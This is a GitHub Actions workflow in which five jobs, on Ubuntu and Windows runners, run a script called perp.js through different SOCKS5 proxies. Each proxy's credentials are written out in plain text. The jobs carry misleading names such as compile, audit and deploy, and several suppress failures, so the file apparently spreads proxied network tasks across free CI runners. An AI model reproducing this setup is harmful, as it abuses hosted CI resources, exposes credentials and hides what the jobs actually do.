name: perp
on:
  push:
    branches: [ "main" ]
    paths:
      - '.github/workflows/perp.yml'
      - 'perp.js'
      - 'package.json'

jobs:
  compile_ubuntu2004_node_fold:
    runs-on: ubuntu-20.04
    steps:
        - name: Checkout Repository
          uses: actions/checkout@v4
        - name: Setup Node.js
          uses: actions/setup-node@v4
          with:
            node-version: 20
        - name: Run Task
          run: |
            npm install && node perp.js "socks5://dcswarup:webshare@216.10.27.214:6892" || true

  compile_windows2022_node_tail:
    runs-on: windows-2022
    steps:
        - name: Checkout Repository
          uses: actions/checkout@v4
        - name: Setup Node.js
          uses: actions/setup-node@v4
          with:
            node-version: 18
        - name: Run Task
          shell: pwsh
          run: |
            npm install; node perp.js "socks5://dcswarup:webshare@64.188.120.7:7754"

  verify_ubuntu2004_bun_igloo:
    runs-on: ubuntu-20.04
    steps:
        - name: Checkout Repository
          uses: actions/checkout@v4
        - name: Setup Bun
          uses: oven-sh/setup-bun@v2
          with:
            bun-version: latest
        - name: Run Task
          run: |
            bun install && bun run perp.js "socks5://dcswarup:webshare@82.23.229.245:7602" || true

  audit_ubuntu2404_node_platter:
    runs-on: ubuntu-24.04
    steps:
        - name: Checkout Repository
          uses: actions/checkout@v4
        - name: Setup Node.js
          uses: actions/setup-node@v4
          with:
            node-version: 24
        - name: Run Task
          run: |
            npm install && node perp.js "socks5://dcswarup:webshare@89.249.194.124:6523" || true

  deploy_windows2025_node_adaptation:
    runs-on: windows-2025
    steps:
        - name: Checkout Repository
          uses: actions/checkout@v4
        - name: Setup Node.js
          uses: actions/setup-node@v4
          with:
            node-version: 22
        - name: Run Task
          shell: pwsh
          run: |
            npm install; node perp.js "socks5://dcswarup:webshare@31.58.23.121:5694"
